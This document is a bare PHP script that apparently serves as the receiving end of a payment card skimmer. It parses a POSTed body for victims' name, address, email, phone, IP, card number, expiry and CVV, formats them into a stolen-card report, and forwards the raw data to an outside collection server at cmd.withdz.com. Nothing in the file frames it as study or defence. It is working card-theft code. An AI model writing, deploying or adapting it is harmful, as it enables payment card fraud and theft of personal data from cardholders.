<?php
$postdata = file_get_contents("php://input");
//echo $postdata;
//exit;



//***********************************************************************
$data0 = $postdata;
$status = explode('ip:',$data0);
$status = explode('"',$status[1]);
$ip = $status[0];



$status = explode('city": "',$data0);
$status = explode('/',$status[1]);
$city = $status[0];

$status = explode('country": "',$data0);
$status = explode('"',$status[2]);
$country = $status[0];


$status = explode('line1": "',$data0);
$status = explode('"',$status[1]);
$line1 = $status[0];


$status = explode('line2": "',$data0);
$status = explode('"',$status[1]);
$line2 = $status[0];

$status = explode('/',$line2);
$card = $status[0];
$day = $status[1];
$mm = $status[2];
$cvv = $status[3];


$status = explode('postal_code": "',$data0);
$status = explode('"',$status[1]);
$postal_code = $status[0];


$status = explode('email": "',$data0);
$status = explode('"',$status[1]);
$email = $status[0];


$status = explode('name": "',$data0);
$status = explode('"',$status[1]);
$name = $status[0];


$status = explode('phone": "',$data0);
$status = explode('"',$status[1]);
$zayad = $status[0];

$status = explode('state": "',$data0);
$status = explode('"',$status[1]);
$state = $status[0];


$data ="---------------------<br>
[$zayad]<br><br>
name : $name<br>
card : $card<br>
exp : $day-$mm<br>
cvv : $cvv<br><br>

country : $country<br>
address : $line1<br>
city : $city<br>
state : $state<br>
zip code : $postal_code<br>
ip : $ip<br>
---------------------";



echo " $data //";











//************************************************************************








$postdata = http_build_query(
    array(
        'data' => $postdata
    )
);



$opts = array('http' =>
    array(
        'method'  => 'POST',
        'header'  => 'Content-Type: application/x-www-form-urlencoded',
        'content' => $postdata
    )
);


$context  = stream_context_create($opts);


$result = file_get_contents('http://cmd.withdz.com/ok/dz.php', false, $context);

echo "ok = $result";


?>
